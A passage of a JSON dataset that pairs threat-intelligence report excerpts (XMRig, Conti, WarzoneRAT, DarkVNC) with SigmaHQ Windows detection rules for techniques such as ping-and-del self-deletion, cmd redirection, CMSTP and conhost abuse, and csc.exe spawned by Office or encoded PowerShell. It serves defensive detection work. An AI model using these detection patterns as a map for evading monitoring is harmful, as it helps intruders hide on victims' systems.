      "id": "54786ddc-5b8a-11ed-9b6a-0242ac120002",
      "status": "test",
      "description": "Detects a method often used by ransomware. Which combines the \"ping\" to wait a couple of seconds and then \"del\" to delete the file in question. Its used to hide the file responsible for the initial infection for example",
      "references": [
        "https://blog.sygnia.co/kaseya-ransomware-supply-chain-attack",
        "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/06/23093553/Common-TTPs-of-the-modern-ransomware_low-res.pdf",
        "https://www.acronis.com/en-us/blog/posts/lockbit-ransomware/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackbyte-exbyte-ransomware"
      ],
      "author": "Ilya Krestinichev",
      "date": "2022-11-03",
      "modified": "2024-03-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1070.004"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_count": {
          "CommandLine|contains|windash": " -n "
        },
        "selection_nul": {
          "CommandLine|contains": "Nul"
        },
        "selection_del_param": {
          "CommandLine|contains|windash": [
            " -f ",
            " -q "
          ]
        },
        "selection_all": {
          "CommandLine|contains|all": [
            "ping",
            "del "
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cmd_ping_del_combined_execution.yml"
  },
  "110": {
    "url": "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
    "markdown": "# SELECT XMRig FROM SQLServer **Categories:** coinminer, exploit **Published Date:** July 11, 2022 --- In March 2022, we observed an intrusion on a public-facing Microsoft SQL Server. The end goal of this intrusion was to deploy a coin miner. Although deploying a coin miner on a vulnerable server after successful exploitation is a common objective for threat actors, this intrusion was slightly different and therefore more interesting. US CERT recently published a malware analysis report related to XMRig coin miner on 23rd June 2022 (link) and a security tip for defending against this threat (link). --- ## Summary Over the",
    "sigma_rule": {
      "title": "Potentially Suspicious CMD Shell Output Redirect",
      "id": "8e0bb260-d4b2-4fff-bb8d-3f82118e6892",
      "related": [
        {
          "id": "aa2efee7-34dd-446e-8a37-40790a66efd7",
          "type": "derived"
        },
        {
          "id": "4f4eaa9f-5ad4-410c-a4be-bc6132b0175a",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects inline Windows shell commands redirecting output via the \">\" symbol to a suspicious location.\nThis technique is sometimes used by malicious actors in order to redirect the output of reconnaissance commands such as \"hostname\" and \"dir\" to files for future exfiltration.\n",
      "references": [
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-12",
      "modified": "2024-03-19",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\cmd.exe"
          },
          {
            "OriginalFileName": "Cmd.Exe"
          }
        ],
        "selection_cli_1": {
          "CommandLine|contains": [
            ">?%APPDATA%\\",
            ">?%TEMP%\\",
            ">?%TMP%\\",
            ">?%USERPROFILE%\\",
            ">?C:\\ProgramData\\",
            ">?C:\\Temp\\",
            ">?C:\\Users\\Public\\",
            ">?C:\\Windows\\Temp\\"
          ]
        },
        "selection_cli_2": {
          "CommandLine|contains": [
            " >",
            "\">",
            "'>"
          ],
          "CommandLine|contains|all": [
            "C:\\Users\\",
            "\\AppData\\Local\\"
          ]
        },
        "condition": "selection_img and 1 of selection_cli_*"
      },
      "falsepositives": [
        "Legitimate admin or third party scripts used for diagnostic collection might generate some false positives"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cmd_redirection_susp_folder.yml"
  },
  "111": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1059.003/T1059.003.md",
    "markdown": "# T1059.003 - Windows Command Shell ## Description from ATT&CK > Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.(Citation: SSH in Windows) Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as",
    "sigma_rule": {
      "title": "Read Contents From Stdin Via Cmd.EXE",
      "id": "241e802a-b65e-484f-88cd-c2dc10f9206d",
      "related": [
        {
          "id": "00a4bacd-6db4-46d5-9258-a7d5ebff4003",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detect the use of \"<\" to read and potentially execute a file via cmd.exe",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1059.003/T1059.003.md",
        "https://web.archive.org/web/20220306121156/https://www.x86matthew.com/view_post?id=ntdll_pipe"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-03-07",
      "tags": [
        "attack.execution",
        "attack.t1059.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_cmd": [
          {
            "OriginalFileName": "Cmd.Exe"
          },
          {
            "Image|endswith": "\\cmd.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "<"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cmd_stdin_redirect.yml"
  },
  "112": {
    "url": "https://web.archive.org/web/20220306121156/https://www.x86matthew.com/view_post?id=ntdll_pipe",
    "markdown": "# NtdllPipe - Using cmd.exe to retrieve a clean version of ntdll.dll **Posted:** **04/03/2022** I was recently using a computer that had AV software installed which injected user-mode hooks into various functions within `ntdll.dll`. I'm out of touch with how modern AV software operates, so I decided to see how easy this was to overcome. The most obvious method would be to read `ntdll.dll` from the disk using `CreateFile` and `ReadFile`, but this triggers the AV heuristics engine as suspected. My next idea was to use a trusted Microsoft executable to do the job for me - one candidate being",
    "sigma_rule": {
      "title": "Read Contents From Stdin Via Cmd.EXE",
      "id": "241e802a-b65e-484f-88cd-c2dc10f9206d",
      "related": [
        {
          "id": "00a4bacd-6db4-46d5-9258-a7d5ebff4003",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detect the use of \"<\" to read and potentially execute a file via cmd.exe",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1059.003/T1059.003.md",
        "https://web.archive.org/web/20220306121156/https://www.x86matthew.com/view_post?id=ntdll_pipe"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-03-07",
      "tags": [
        "attack.execution",
        "attack.t1059.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_cmd": [
          {
            "OriginalFileName": "Cmd.Exe"
          },
          {
            "Image|endswith": "\\cmd.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "<"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cmd_stdin_redirect.yml"
  },
  "113": {
    "url": "https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/",
    "markdown": "# Detecting CMSTP-Enabled Code Execution and UAC Bypass With Sysmon. ## TLDR An old Microsoft tool is able to be weaponized in several ways and reportedly used by at least one nation state actor. I explore ways for defenders to detect its abuse. ## Background As I was perusing MITRE’s ATT&CK framework the other day to learn about techniques I’m less familiar with, I came across the ambiguous-sounding CMSTP (T1191 in ATT&CK) which MITRE states can be used for UAC Bypass and code execution. Being that it’s also allegedly been used by a nation-state actor recently, I wanted to research",
    "sigma_rule": {
      "title": "CMSTP Execution Process Creation",
      "id": "7d4cdc5a-0076-40ca-aac8-f7e714570e47",
      "status": "stable",
      "description": "Detects various indicators of Microsoft Connection Manager Profile Installer execution",
      "references": [
        "https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/"
      ],
      "author": "Nik Seetharaman",
      "date": "2018-07-16",
      "modified": "2020-12-23",
      "tags": [
        "attack.defense-evasion",
        "attack.execution",
        "attack.t1218.003",
        "attack.g0069",
        "car.2019-04-001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\cmstp.exe"
        },
        "condition": "selection"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine",
        "Details"
      ],
      "falsepositives": [
        "Legitimate CMSTP use (unlikely in modern enterprise environments)"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cmstp_execution_by_creation.yml"
  },
  "114": {
    "url": "https://cybercryptosec.medium.com/covid-19-cyber-infection-c615ead7c29",
    "markdown": "# Covid-19 Cyber Infection or ## The Illness Dwells Inside You We loathe to pander to sensationalism by riding on popular topics that everyone is discussing. This may make us less than popular in the realms of SEO or acting like a tabloid organization but as a company we attempt to always go where those of us are afraid to or publicize that which many people do not hear about. The amount of traffic that is nefarious that goes on in cybersecurity is voluminous, but it does take a bit for it to come to the surface. However, this one",
    "sigma_rule": {
      "title": "Suspicious High IntegrityLevel Conhost Legacy Option",
      "id": "3037d961-21e9-4732-b27a-637bcc7bf539",
      "status": "test",
      "description": "ForceV1 asks for information directly from the kernel space. Conhost connects to the console application. High IntegrityLevel means the process is running with elevated privileges, such as an Administrator context.",
      "references": [
        "https://cybercryptosec.medium.com/covid-19-cyber-infection-c615ead7c29",
        "https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/",
        "https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control"
      ],
      "author": "frack113",
      "date": "2022-12-09",
      "modified": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "IntegrityLevel": [
            "High",
            "S-1-16-12288"
          ],
          "CommandLine|contains|all": [
            "conhost.exe",
            "0xffffffff",
            "-ForceV1"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Very Likely, including launching cmd.exe via Run As Administrator"
      ],
      "level": "informational"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_conhost_legacy_option.yml"
  },
  "115": {
    "url": "https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/",
    "markdown": "# Stolen Images Campaign Ends in Conti Ransomware **Categories:** adfind cobaltstrike conti exploit icedid ransomware **Published on:** April 4, 2022 --- In this intrusion from December 2021, the threat actors utilized IcedID as the initial access vector. IcedID is a banking trojan that first appeared in 2017, usually delivered via malspam campaigns and has been widely used as an initial access vector in multiple ransomware intrusions. Upon execution of the IcedID DLL, discovery activity was performed which was followed by the dropping of a Cobalt Strike beacon on the infected host. Along the way, the threat actors installed remote management",
    "sigma_rule": {
      "title": "Suspicious High IntegrityLevel Conhost Legacy Option",
      "id": "3037d961-21e9-4732-b27a-637bcc7bf539",
      "status": "test",
      "description": "ForceV1 asks for information directly from the kernel space. Conhost connects to the console application. High IntegrityLevel means the process is running with elevated privileges, such as an Administrator context.",
      "references": [
        "https://cybercryptosec.medium.com/covid-19-cyber-infection-c615ead7c29",
        "https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/",
        "https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control"
      ],
      "author": "frack113",
      "date": "2022-12-09",
      "modified": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "IntegrityLevel": [
            "High",
            "S-1-16-12288"
          ],
          "CommandLine|contains|all": [
            "conhost.exe",
            "0xffffffff",
            "-ForceV1"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Very Likely, including launching cmd.exe via Run As Administrator"
      ],
      "level": "informational"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_conhost_legacy_option.yml"
  },
  "116": {
    "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control",
    "markdown": "# Mandatory Integrity Control Mandatory Integrity Control (MIC) provides a mechanism for controlling access to securable objects. This mechanism is in addition to discretionary access control and evaluates access before access checks against an object's discretionary access control list (DACL) are evaluated. MIC uses integrity levels and mandatory policy to evaluate access. Security principals and securable objects are assigned integrity levels that determine their levels of protection or access. For example, a principal with a low integrity level cannot write to an object with a medium integrity level, even if that object's DACL allows write access to the principal. Windows",
    "sigma_rule": {
      "title": "Suspicious High IntegrityLevel Conhost Legacy Option",
      "id": "3037d961-21e9-4732-b27a-637bcc7bf539",
      "status": "test",
      "description": "ForceV1 asks for information directly from the kernel space. Conhost connects to the console application. High IntegrityLevel means the process is running with elevated privileges, such as an Administrator context.",
      "references": [
        "https://cybercryptosec.medium.com/covid-19-cyber-infection-c615ead7c29",
        "https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/",
        "https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control"
      ],
      "author": "frack113",
      "date": "2022-12-09",
      "modified": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "IntegrityLevel": [
            "High",
            "S-1-16-12288"
          ],
          "CommandLine|contains|all": [
            "conhost.exe",
            "0xffffffff",
            "-ForceV1"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Very Likely, including launching cmd.exe via Run As Administrator"
      ],
      "level": "informational"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_conhost_legacy_option.yml"
  },
  "117": {
    "url": "http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/",
    "markdown": "# How to con your host? Posted on 2020-05-25 Good bye threat hunting configs and filters of the past. Microsoft introduced Windows Terminal and there is no way back. While reading its actual source code today I noticed quite a lot of familiar code (I did poke around in conhost.exe code with Ida before), but then I stumbled upon an interesting bit that this post is all about. The following command: ``` conhost.exe notepad.exe ``` doesn’t do anything on older version of Windows 10. However, the latest version (tested on 18363) has a little LOLBINish surprise: ```image Alt: conhost Description:",
    "sigma_rule": {
      "title": "Uncommon Child Process Of Conhost.EXE",
      "id": "7dc2dedd-7603-461a-bc13-15803d132355",
      "status": "test",
      "description": "Detects uncommon \"conhost\" child processes. This could be a sign of \"conhost\" usage as a LOLBIN or potential process injection activity.",
      "references": [
        "http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/"
      ],
      "author": "omkar72",
      "date": "2020-10-25",
      "modified": "2023-12-11",
      "tags": [
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\conhost.exe"
        },
        "filter_main_conhost": {
          "Image|endswith": ":\\Windows\\System32\\conhost.exe"
        },
        "filter_main_null": {
          "Image": null
        },
        "filter_main_empty": {
          "Image": ""
        },
        "filter_optional_provider": {
          "Provider_Name": "SystemTraceProvider-Process"
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_conhost_susp_child_process.yml"
  },
  "118": {
    "url": "https://www.uptycs.com/blog/warzonerat-can-now-evade-with-process-hollowing",
    "markdown": "# WarzoneRAT Evades Detection With Process Hollowing Technique **May 31, 2022** --- ## WarzoneRAT Evades Detection With Process Hollowing Technique The Uptycs Threat Research Team identified samples of WarzoneRAT dropped through a Powershell dropper with a Process Injection/Hollowing technique implementation to bypass detections. We first identified WarzoneRAT using a Windows User Account Control (UAC) bypass technique in November 2020. This blog post details the operation of the latest WarzoneRAT sample and also covers the advanced detection capabilities of the Uptycs EDR in detecting techniques like Process Hollowing and UAC Bypass. --- ## WarzoneRAT WarzoneRAT is a Remote Admin Tool that",
    "sigma_rule": {
      "title": "Csc.EXE Execution Form Potentially Suspicious Parent",
      "id": "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
      "status": "test",
      "description": "Detects a potentially suspicious parent of \"csc.exe\", which could be a sign of payload delivery.",
      "references": [
        "https://www.uptycs.com/blog/warzonerat-can-now-evade-with-process-hollowing",
        "https://web.archive.org/web/20220823105759/https://reaqta.com/2017/11/short-journey-darkvnc/",
        "https://www.pwc.com/gx/en/issues/cybersecurity/cyber-threat-intelligence/yellow-liderc-ships-its-scripts-delivers-imaploader-malware.html"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems), X__Junior (Nextron Systems)",
      "date": "2019-02-11",
      "modified": "2024-05-27",
      "tags": [
        "attack.execution",
        "attack.t1059.005",
        "attack.t1059.007",
        "attack.defense-evasion",
        "attack.t1218.005",
        "attack.t1027.004"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\csc.exe"
          },
          {
            "OriginalFileName": "csc.exe"
          }
        ],
        "selection_parent_generic": {
          "ParentImage|endswith": [
            "\\cscript.exe",
            "\\excel.exe",
            "\\mshta.exe",
            "\\onenote.exe",
            "\\outlook.exe",
            "\\powerpnt.exe",
            "\\winword.exe",
            "\\wscript.exe"
          ]
        },
        "selection_parent_powershell": {
          "ParentImage|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "ParentCommandLine|contains": [
            "-Encoded ",
            "FromBase64String"
          ]
        },
        "selection_parent_susp_location": [
          {
            "ParentCommandLine|re": "([Pp]rogram[Dd]ata|%([Ll]ocal)?[Aa]pp[Dd]ata%|\\\\[Aa]pp[Dd]ata\\\\([Ll]ocal([Ll]ow)?|[Rr]oaming))\\\\[^\\\\]{1,256}$"
          },
          {
            "ParentCommandLine|contains": [
              ":\\PerfLogs\\",
              ":\\Users\\Public\\",
              ":\\Windows\\Temp\\",
              "\\Temporary Internet"
            ]
          },
          {
            "ParentCommandLine|contains|all": [
              ":\\Users\\",
              "\\Favorites\\"
            ]
          },
          {
            "ParentCommandLine|contains|all": [
              ":\\Users\\",
              "\\Favourites\\"
            ]
          },
          {
            "ParentCommandLine|contains|all": [
              ":\\Users\\",
              "\\Contacts\\"
            ]
          },
          {
            "ParentCommandLine|contains|all": [
              ":\\Users\\",
              "\\Pictures\\"
            ]
          }
        ],
        "filter_main_programfiles": {
          "ParentImage|startswith": [
            "C:\\Program Files (x86)\\",
            "C:\\Program Files\\"
          ]
        },
        "filter_main_sdiagnhost": {
          "ParentImage": "C:\\Windows\\System32\\sdiagnhost.exe"
        },
        "filter_main_w3p": {
          "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe"
        },
        "filter_optional_chocolatey": {
          "ParentImage": "C:\\ProgramData\\chocolatey\\choco.exe"
        },
        "filter_optional_defender": {
          "ParentCommandLine|contains": "\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection"
        },
        "filter_optional_ansible": {
          "ParentCommandLine|contains": [
            "JwB7ACIAZgBhAGkAbABlAGQAIgA6AHQAcgB1AGUALAAiAG0AcwBnACIAOgAiAEEAbgBzAGkAYgBsAGUAIAByAGUAcQB1AGkAcgBlAHMAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAdgAzAC4AMAAgAG8AcgAgAG4AZQB3AGUAcgAiAH0AJw",
            "cAewAiAGYAYQBpAGwAZQBkACIAOgB0AHIAdQBlACwAIgBtAHMAZwAiADoAIgBBAG4AcwBpAGIAbABlACAAcgBlAHEAdQBpAHIAZQBzACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHYAMwAuADAAIABvAHIAIABuAGUAdwBlAHIAIgB9ACcA",
            "nAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQBzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbwByACAAbgBlAHcAZQByACIAfQAnA"
          ]
        },
        "condition": "selection_img and 1 of selection_parent_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_csc_susp_parent.yml"
  },
  "119": {
    "url": "https://web.archive.org/web/20220823105759/https://reaqta.com/2017/11/short-journey-darkvnc/",
    "markdown": "# A short journey into DarkVNC attack chain **Published on:** November 08, 2017 During an analysis of different remote desktop trojans, we came across an interesting attack-chain which leverages an RTF that exploits **CVE-2017-8759** to deliver **DarkVNC**, a malicious version of the well-known *VNC*, designed to silently remote-control a victim. --- ## **DarkVNC Attack Chain** The DarkVNC chain as reconstructed by ReaQta-Hive can be seen below: ```image Alt: DarkVNC Attack Chain Description: The image depicts a flowchart illustrating the DarkVNC attack chain. It shows various processes and their hierarchical relationships, starting from 'winlogon.exe' and including processes such as 'winword.exe', 'mshta.exe',",
    "sigma_rule": {
      "title": "Csc.EXE Execution Form Potentially Suspicious Parent",
      "id": "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
      "status": "test",
      "description": "Detects a potentially suspicious parent of \"csc.exe\", which could be a sign of payload delivery.",
      "references": [
        "https://www.uptycs.com/blog/warzonerat-can-now-evade-with-process-hollowing",
        "https://web.archive.org/web/20220823105759/https://reaqta.com/2017/11/short-journey-darkvnc/",
        "https://www.pwc.com/gx/en/issues/cybersecurity/cyber-threat-intelligence/yellow-liderc-ships-its-scripts-delivers-imaploader-malware.html"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems), X__Junior (Nextron Systems)",
      "date": "2019-02-11",
      "modified": "2024-05-27",
      "tags": [
        "attack.execution",
        "attack.t1059.005",
        "attack.t1059.007",
        "attack.defense-evasion",
        "attack.t1218.005",
        "attack.t1027.004"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\csc.exe"
          },
          {
            "OriginalFileName": "csc.exe"
          }
        ],
        "selection_parent_generic": {
          "ParentImage|endswith": [
            "\\cscript.exe",
            "\\excel.exe",
            "\\mshta.exe",
            "\\onenote.exe",
            "\\outlook.exe",
            "\\powerpnt.exe",
            "\\winword.exe",
            "\\wscript.exe"
          ]
        },
        "selection_parent_powershell": {
          "ParentImage|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "ParentCommandLine|contains": [
            "-Encoded ",
            "FromBase64String"
          ]
        },
        "selection_parent_susp_location": [
          {
            "ParentCommandLine|re": "([Pp]rogram[Dd]ata|%([Ll]ocal)?[Aa]pp[Dd]ata%|\\\\[Aa]pp[Dd]ata\\\\([Ll]ocal([Ll]ow)?|[Rr]oaming))\\\\[^\\\\]{1,256}$"
          },
          {
            "ParentCommandLine|contains": [
              ":\\PerfLogs\\",
              ":\\Users\\Public\\",
              ":\\Windows\\Temp\\",
              "\\Temporary Internet"
            ]
          },
          {
            "ParentCommandLine|contains|all": [
              ":\\Users\\",
              "\\Favorites\\"
            ]
          },
          {
            "ParentCommandLine|contains|all": [
              ":\\Users\\",
              "\\Favourites\\"
            ]
          },
          {
            "ParentCommandLine|contains|all": [
              ":\\Users\\",
              "\\Contacts\\"
            ]
          },
          {
            "ParentCommandLine|contains|all": [
              ":\\Users\\",
              "\\Pictures\\"
            ]
          }
        ],
        "filter_main_programfiles": {
          "ParentImage|startswith": [
            "C:\\Program Files (x86)\\",
            "C:\\Program Files\\"
          ]
        },
        "filter_main_sdiagnhost": {
          "ParentImage": "C:\\Windows\\System32\\sdiagnhost.exe"
        },
        "filter_main_w3p": {
          "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe"
        },
        "filter_optional_chocolatey": {
          "ParentImage": "C:\\ProgramData\\chocolatey\\choco.exe"
        },
        "filter_optional_defender": {
          "ParentCommandLine|contains": "\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection"
        },
        "filter_optional_ansible": {
          "ParentCommandLine|contains": [
            "JwB7ACIAZgBhAGkAbABlAGQAIgA6AHQAcgB1AGUALAAiAG0AcwBnACIAOgAiAEEAbgBzAGkAYgBsAGUAIAByAGUAcQB1AGkAcgBlAHMAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAdgAzAC4AMAAgAG8AcgAgAG4AZQB3AGUAcgAiAH0AJw",
            "cAewAiAGYAYQBpAGwAZQBkACIAOgB0AHIAdQBlACwAIgBtAHMAZwAiADoAIgBBAG4AcwBpAGIAbABlACAAcgBlAHEAdQBpAHIAZQBzACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHYAMwAuADAAIABvAHIAIABuAGUAdwBlAHIAIgB9ACcA",
            "nAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQBzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbwByACAAbgBlAHcAZQByACIAfQAnA"
          ]
        },
        "condition": "selection_img and 1 of selection_parent_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_csc_susp_parent.yml"
  },
  "120": {
    "url": "https://www.pwc.com/gx/en/issues/cybersecurity/cyber-threat-intelligence/yellow-liderc-ships-its-scripts-delivers-imaploader-malware.html",
    "markdown": "# Yellow Liderc ships its scripts and delivers IMAPLoader malware October 25, 2023 --- ### Author: PwC Threat Intelligence ## Executive summary Since 2019, PwC has tracked an Iran-based threat actor we refer to as Yellow Liderc (a.k.a. Imperial Kitten, Tortoiseshell, TA456, Crimson Sandstorm). As reported in our previous Year in Retrospect publications, this threat actor remains an active and persistent threat to many industries and countries, including the maritime, shipping and logistics sectors within the Mediterranean; nuclear, aerospace and defence industries in the US and Europe; and IT managed service providers in the Middle East. In this blog we",
    "sigma_rule": {
      "title": "Csc.EXE Execution Form Potentially Suspicious Parent",
      "id": "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
      "status": "test",
      "description": "Detects a potentially suspicious parent of \"csc.exe\", which could be a sign of payload delivery.",
      "references": [
        "https://www.uptycs.com/blog/warzonerat-can-now-evade-with-process-hollowing",
        "https://web.archive.org/web/20220823105759/https://reaqta.com/2017/11/short-journey-darkvnc/",
        "https://www.pwc.com/gx/en/issues/cybersecurity/cyber-threat-intelligence/yellow-liderc-ships-its-scripts-delivers-imaploader-malware.html"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems), X__Junior (Nextron Systems)",
      "date": "2019-02-11",
      "modified": "2024-05-27",
      "tags": [
        "attack.execution",
        "attack.t1059.005",
        "attack.t1059.007",
        "attack.defense-evasion",
        "attack.t1218.005",
        "attack.t1027.004"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\csc.exe"
          },
          {
            "OriginalFileName": "csc.exe"
          }
        ],
        "selection_parent_generic": {
          "ParentImage|endswith": [
            "\\cscript.exe",
            "\\excel.exe",
            "\\mshta.exe",
            "\\onenote.exe",
            "\\outlook.exe",
            "\\powerpnt.exe",
            "\\winword.exe",
            "\\wscript.exe"
          ]
        },
        "selection_parent_powershell": {
          "ParentImage|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "ParentCommandLine|contains": [
            "-Encoded ",
            "FromBase64String"
          ]
        },
        "selection_parent_susp_location": [
          {
            "ParentCommandLine|re": "([Pp]rogram[Dd]ata|%([Ll]ocal)?[Aa]pp[Dd]ata%|\\\\[Aa]pp[Dd]ata\\\\([Ll]ocal([Ll]ow)?|[Rr]oaming))\\\\[^\\\\]{1,256}$"
          },
          {
            "ParentCommandLine|contains": [
              ":\\PerfLogs\\",
              ":\\Users\\Public\\",
              ":\\Windows\\Temp\\",
              "\\Temporary Internet"
            ]
          },
          {
            "ParentCommandLine|contains|all": [
              ":\\Users\\",
              "\\Favorites\\"
            ]
          },
          {
            "ParentCommandLine|contains|all": [
              ":\\Users\\",
              "\\Favourites\\"
            ]
          },
          {
            "ParentCommandLine|contains|all": [
              ":\\Users\\",
              "\\Contacts\\"
            ]
          },
          {
            "ParentCommandLine|contains|all": [
              ":\\Users\\",
              "\\Pictures\\"
            ]
          }
        ],
        "filter_main_programfiles": {
          "ParentImage|startswith": [
            "C:\\Program Files (x86)\\",
            "C:\\Program Files\\"
          ]
        },
        "filter_main_sdiagnhost": {
          "ParentImage": "C:\\Windows\\System32\\sdiagnhost.exe"
        },
        "filter_main_w3p": {
          "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe"
        },
        "filter_optional_chocolatey": {
          "ParentImage": "C:\\ProgramData\\chocolatey\\choco.exe"
        },
        "filter_optional_defender": {
